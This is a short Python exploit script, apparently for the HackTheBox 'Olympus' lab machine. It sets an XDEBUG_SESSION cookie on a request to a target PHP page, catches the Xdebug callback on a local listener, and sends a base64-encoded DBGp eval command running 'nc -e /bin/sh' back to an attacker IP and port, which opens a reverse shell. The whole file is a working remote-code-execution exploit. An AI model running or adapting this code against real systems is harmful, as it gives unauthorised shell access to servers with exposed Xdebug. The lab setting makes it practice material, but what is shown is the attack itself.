#!/usr/bin/python3
# Maquina Olympus S4vitar
import socket, requests, sys
from base64 import b64encode

if len(sys.argv) !=2:
	print("\n[*] Uso de python {} <puerto>\n".format(sys.argv[0]))
	sys.exit(1)

ip = "10.10.10.10"
port = sys.argv[1]

# Start Listener
local_ip = "0.0.0.0"
local_port = 9000

print("\n[*] Starting listener on {}:{}".format(local_ip, local_port))

sk = socket.socket()
sk.bind((local_ip, local_port))
sk.listen(10)
print("\n[+] Listening...")
print("\n[*] Sending request...\n")

try:
	r = requests.get("http://10.10.10.83/index.php", headers={"Cookie": "XDEBUG_SESSION=S4vitar"}, timeout=2)
except:
	pass

# Catch callback
conn, addr = sk.accept()
client_data = conn.recv(1024)
print("\n[+] Connection received from {}:{}".format(addr[0], addr[1], local_port))

cmd = 'system("nc -e /bin/sh {} {}")'.format(ip, port).encode('utf-8')
conn.sendall(('eval -i 1 -- %s\x00' %b64encode(cmd).decode('utf-8')).encode('utf-8'))

sk.close()
conn.close()
